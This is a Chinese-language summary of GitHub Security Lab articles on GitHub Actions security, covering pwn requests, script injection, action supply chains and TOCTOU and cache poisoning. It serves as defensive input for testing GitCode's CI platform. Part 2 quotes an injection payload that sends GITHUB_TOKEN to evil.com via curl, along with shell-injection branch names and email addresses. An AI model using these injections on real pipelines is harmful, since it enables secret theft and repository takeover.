# GitHub Actions 安全系列文章摘要

> 来源：https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
> 作者：Jaroslav Lobačevski (Part 1, 3), Alvaro Munoz (Part 4)
> 抓取时间：2026-07-20
> 用途：作为安全维度 agent 生成 intent 的核心输入，提供 CI/CD 攻击面的业界知识

---

## Part 1: Preventing Pwn Requests（2021-08-03）

**核心问题**：`pull_request_target` 触发器 + 显式 checkout 不信任的 PR 代码 = 仓库被接管。

**风险**：
- `pull_request_target` 在 base 分支上下文运行，拥有完整 secrets 和 write token
- 从 fork PR checkout 不受信任的代码后，恶意 PR 作者可获得仓库写权限或窃取 secrets

**推荐方案**：
- 分离为两个 workflow：`pull_request`（非特权，处理 PR 代码）+ `workflow_run`（特权，在安全上下文中处理结果）
- 避免在 `pull_request_target` workflow 中 checkout 不信任代码

**GitCode 测试关注点**：
- `pull_request_target` 是否在 base 分支上下文执行
- fork PR 的 secret 隔离是否正确
- `workflow_run` 触发机制是否支持（若 GitCode 不支持，如何做同等级别的安全隔离）

---

## Part 2: Untrusted Input（2021-08-04）

**核心问题**：GitHub Actions 表达式 `${{ }}` 在内联脚本中的替换发生在 shell 脚本生成之前，导致脚本注入。

**不可信输入源**（GitHub event context 中可能被攻击者控制的字段）：
- `github.event.issue.title` / `issue.body`
- `github.event.pull_request.title` / `pull_request.body` / `pull_request.head.ref` / `pull_request.head.label`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.commits.*.message` / `commits.*.author.email` / `commits.*.author.name`
- `github.event.head_commit.message` / `head_commit.author.email` / `head_commit.author.name`
- `github.head_ref`

**三种注入攻击模式**：

### 攻击 1：双重表达式求值
- 某些 Action 内部使用了模板引擎（如 lodash）
- 攻击者在 PR 评论中放入 `{{ 1 + 1 }}` → 外层 `${{ }}` 求值后 → 内层模板引擎二次求值 → 可执行任意 Node.js 代码

### 攻击 2：Shell 脚本注入
```yaml
# 危险写法
- run: |
    title="${{ github.event.issue.title }}"
```
攻击者标题：`a"; curl http://evil.com?token=$GITHUB_TOKEN;#`

### 攻击 3：非显而易见的不可信源
- **分支名**：`zzz";echo${IFS}hello";#` 是合法 git 分支名，可注入 shell
- **Email 地址**：RFC 5322 允许极端灵活格式，如 `` `echo${IFS}hello`@domain.com ``

**修复方案**：将不可信值先分配到中间环境变量，再在 shell 中引用：
```yaml
# 安全写法
- name: print title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```
关键：表达式值在生成脚本之前被存入内存变量，不会影响脚本生成过程。

**Token 窃取**：
- 若 secrets 存在环境变量中 → `printenv` 查看
- 若 secrets 直接用在表达式中 → 生成的 shell 脚本存储在磁盘上，可读取
- 即使 GitHub 自动遮蔽日志中的 secret，攻击者可通过分片输出绕过

**GitCode 测试关注点**：
- `${{ atomgit.event.* }}` 上下文中哪些字段可能包含不可信输入
- 中间环境变量模式是否同样有效阻止注入
- 表达式注入防护（对应 INTENT-SEC-009~014）
- ATOMGIT_TOKEN 在 job 运行期间的磁盘存储位置

---

## Part 3: Building Blocks — 第三方 Action 供应链安全（2021-08-05）

**核心问题**：`uses:` 引用的第三方 action 可获得计算资源、secrets 访问权和 `GITHUB_TOKEN`。

**Token 暴露**：
- 即使 workflow YAML 中不显式引用 `GITHUB_TOKEN`，所有被引用的 action 仍可访问它
- 控制 action YAML 定义的攻击者可添加 input 字段，默认值为 `${{ github.token }}` 来窃取

**最小权限原则**：
- 将 secret 范围限制在最小必要权限（如 cloud 上传 token 设 write-only）
- 不同任务使用不同 token
- 将 `GITHUB_TOKEN` 的组织/仓库默认权限改为 read-only
- 在 job 级别显式声明 `permissions:` 收窄权限

**Action 引用的供应链安全**（五种 pin 方式）：
| 方式 | 安全性 |
|---|---|
| 分支名 `@main` | 差——完全信任作者，可能被推送恶意代码 |
| Tag `@v1` | 中——防止意外更改，但 tag 可被重新指向 |
| 短 hash `@26968a0` | 已弃用——hash 碰撞攻击 |
| **完整 commit hash** | **最安全**——不可变引用 |
| Fork 到自己的仓库 | 完全控制——但需手动合并上游安全修复 |

**评估 Action 的建议**：
- 查找 "Verified creator" 标记
- 审计源代码，尤其是单用途的小型 action
- 关注是否有向第三方主机发送数据的可疑行为
- 使用 Dependabot 自动更新 action 引用时务必审查变更内容

**GitCode 测试关注点**：
- 第三方 action 的 `uses:` 语法是否支持完整 commit hash pin
- ATOMGIT_TOKEN 默认权限范围
- job 级 `permissions:` 声明是否生效
- 是否支持 Dependabot 等价机制

---

## Part 4: New Patterns and Mitigations（2025-01-16）

**核心问题**：新发现的漏洞模式 + CodeQL 静态度量支持。

**漏洞模式 1：`pull_request_target` 滥用**
- **不信任代码执行**：checkout PR 的 head ref 后执行恶意代码
- **TOCTOU 攻击**：提交无害 PR → 等待审批 → 推送恶意 commit → workflow 以特权身份执行
- **非默认分支潜伏威胁**：即使默认分支的 workflow 已修复，旧版本的 workflow 在其他分支仍然可被利用
- **Cache 投毒**：即使 `permissions: {}` 移除写权限，仍可投毒缓存影响其他 workflow

**漏洞模式 2：`workflow_run` 安全边界**
- 攻击者可修改触发 workflow 的事件类型使其触发，进而触发特权 `workflow_run` workflow
- **Artifact 投毒**：恶意 PR 上传被污染的 artifact，`workflow_run` download 后使用而未验证
- 有效缓解：用 `branches` 过滤、验证事件来源、将所有 artifact 视为不可信

**漏洞模式 3：`issue_comment` 触发器陷阱（IssueOps）**
- TOCTOU：管理员评论触发 workflow 后，攻击者在执行前推送恶意代码
- 绕过 PR 审批：`issue_comment` workflow 不受 PR 审批机制保护
- 唯一有效缓解：用 **label gates 替代 comment 触发**——`labeled` activity type + commit SHA（非 head ref）

**GitCode 测试关注点**：
- `pull_request` types 中的 `labeled` 是否支持
- fork PR 中 cache 的作用域隔离
- artifact 是否在 `workflow_run` 等价场景下被正确隔离

---

## 总结：对 GitCode Action 安全测试的关键启示

### 输入验证维度
1. **所有用户可控制的事件上下文字段都是潜在注入源**——必须验证每个出入到 `run:` 的值是否经过安全的中间变量处理
2. 分支名、email、PR 正文/标题、commit message —— 这些不显眼的字段是最危险的注入面
3. 表达式求值的安全性（`${{ }}` 是否在生成脚本之前完成替换）

### Secret 管理维度
4. fork PR 的 token 权限降级是安全命脉——token 只读 + secret 完全隔离
5. Secret 日志遮蔽必须是真正的安全边界（不能通过分片/base64/拼接绕过）
6. Token 生命周期管理（过期 token 不能通过缓存复活）

### 供应链维度
7. 第三方 action 引用必须支持完整 commit hash pin
8. 默认 GITHUB_TOKEN 权限应为 read-only
9. Action marketplace 的 verified creator 机制

### 工作流设计维度
10. 分离非特权 workflow（`pull_request`）+ 特权 workflow（`workflow_run`）是防止 Pwn Requests 的标准模式
11. Label gates > comment triggers（防止 TOCTOU + 绕过审批）
12. Cache / artifact 在 fork PR 场景下必须隔离

---

*本摘要由 GitHub Security Lab 系列 4 篇文章综合提取，作为 `security-knowledge/` 的核心参考输入。*
